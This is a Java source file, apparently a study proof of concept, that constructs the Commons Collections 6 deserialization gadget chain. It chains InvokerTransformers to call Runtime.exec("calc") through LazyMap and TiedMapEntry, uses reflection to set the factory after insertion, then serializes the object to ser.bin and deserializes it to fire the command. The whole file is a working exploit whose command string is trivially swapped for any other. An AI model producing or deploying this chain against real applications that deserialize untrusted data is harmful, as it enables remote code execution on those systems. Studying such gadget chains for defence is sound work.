package com.melll;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;


public class CC6 {
    public static void main(String[] args) throws Exception {
        Transformer[] Transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);

        HashMap<Object,Object> hashMap = new HashMap<>();
        LazyMap lazymap = (LazyMap) LazyMap.decorate(hashMap, new ConstantTransformer(0));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"vshex");
        HashMap<Object,Object> hmap = new HashMap<>();
        hmap.put(tiedMapEntry,"vshex");
        lazymap.clear();

        Field field = LazyMap.class.getDeclaredField("factory");
        field.setAccessible(true);
        field.set(lazymap,chainedTransformer);

        serialize(hmap);
        unsserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));
        oos.writeObject(obj);
    }
    public static Object unsserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(Filename)));
        return ois.readObject();

    }
}